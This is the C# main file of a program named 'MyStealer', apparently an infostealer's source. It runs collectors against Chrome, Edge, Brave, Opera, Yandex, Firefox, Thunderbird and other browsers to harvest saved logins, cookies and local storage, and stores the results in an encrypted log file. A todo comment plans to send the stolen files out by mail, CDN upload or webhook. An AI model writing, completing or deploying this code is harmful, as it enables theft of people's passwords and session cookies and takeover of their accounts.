using MyStealer.Collector;
using MyStealer.Collector.Browser;
using MyStealer.Collector.Browser.ChromiumBased;
using MyStealer.Collector.Browser.FirefoxBased;
using MyStealer.Shared;
using Serilog;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

namespace MyStealer
{
    internal static class Program
    {
        private const string LogTemplate = "{Timestamp:yyyy-MM-dd HH:mm:ss.fff zzz} [{Level:u3}] <{Module:l}> {Message:lj}{NewLine}{Exception}";

        private static readonly BrowserCollectorBase[] BrowserCollectors = new BrowserCollectorBase[] {
            new Brave(),
            new Chrome(),
            new IridiumBrowser(),
            new MicrosoftEdge(),
            new NaverWhale(),
            new Opera(),
            new YandexBrowser(),
            new Firefox(),
            new LibreWolf(),
            new PaleMoon(),
            new Thunderbird(),
            new WaterFox(),
        };

        static void Main(string[] args)
        {
            using (var encHook = new LogEncryptionHook())
            {
                try
                {
                    /* Prepare */

                    NativeMethods.WriteLibraries();
                    if (File.Exists(Config.LogFilePath))
                        File.Delete(Config.LogFilePath); // Delete previous file to prevent appending encryption header

                    var logConfig = new LoggerConfiguration();
                    logConfig = (args.Length > 0 && args[0] == "verbose") ? logConfig.MinimumLevel.Verbose() : logConfig.MinimumLevel.Debug();
                    logConfig = logConfig.WriteTo.File(Config.LogFilePath, outputTemplate: LogTemplate, hooks: encHook);
                    LogExt.BaseLogger = new SerilogDelegate(logConfig.CreateLogger());
                    Log.Logger = ((SerilogDelegate)LogExt.ForModule("Main")).BaseLogger; // Completely f*** up the abstraction layer

                    /* Do the job */

                    Log.Information("Program entry point called on: {date}", DateTime.Now);

                    var creds = new HashSet<BrowserLogin>();
                    var cookies = new HashSet<BrowserCookie>();
                    var localStorage = new HashSet<BrowserLocalStorage>();
                    foreach (var browser in BrowserCollectors)
                    {
                        try
                        {
                            var sw = new Stopwatch();
                            Log.Debug("Check if browser is available: {browser}", browser.ModuleName);
                            if (browser.IsAvailable())
                            {
                                sw.Start();
                                Log.Information("Running browser data collector: {browser}", browser.ModuleName);
                                browser.Initialize();
                                try
                                {
                                    foreach (var cred in browser.GetLogins())
                                    {
                                        creds.Add(cred);
#if DEBUG
                                        Log.Information(cred.ToString());
#endif
                                    }
                                }
                                catch (Exception ex)
                                {
                                    Log.Error(ex, "Browser credentials {name} failed.", browser.ModuleName);
                                }

                                try
                                {
                                    foreach (var cookie in browser.GetCookies())
                                    {
                                        cookies.Add(cookie);
#if DEBUG
                                        Log.Information(cookie.ToString());
#endif
                                    }
                                }
                                catch (Exception ex)
                                {
                                    Log.Error(ex, "Browser cookies {name} failed.", browser.ModuleName);
                                }

                                try
                                {
                                    foreach (var storageEntry in browser.GetLocalStorageEntries())
                                    {
                                        localStorage.Add(storageEntry);
#if DEBUG
                                        Log.Information(storageEntry.ToString());
#endif
                                    }
                                }
                                catch (Exception ex)
                                {
                                    Log.Error(ex, "Browser storages {name} failed.", browser.ModuleName);
                                }

                                sw.Stop();
                                Log.Debug("Browser collector {browser} took {time} ms", browser.ModuleName, sw.ElapsedMilliseconds);
                            }
                        }
                        catch (Exception ex)
                        {
                            Log.Error(ex, "Browser collector {name} failed.", browser.ModuleName);
                        }
                        finally
                        {
                            browser.Dispose(); // Unload natives
                        }
                    }

                    /* Cleanup */

                    NativeMethods.CleanupLibraries();
                }
                catch (Exception ex)
                {
                    Log.Fatal(ex, "Main thread exception");
                }
                finally
                {
                    Log.CloseAndFlush();
                }
            }

            /* todo: send files over the internet (send to mail, upload to cdn, webhook, etc.) */

            // todo: debug purpose, remove later
            MyCryptExt.DecryptToFile(Config.LogFilePath + ".dec", File.OpenRead(Config.LogFilePath));
        }
    }
}
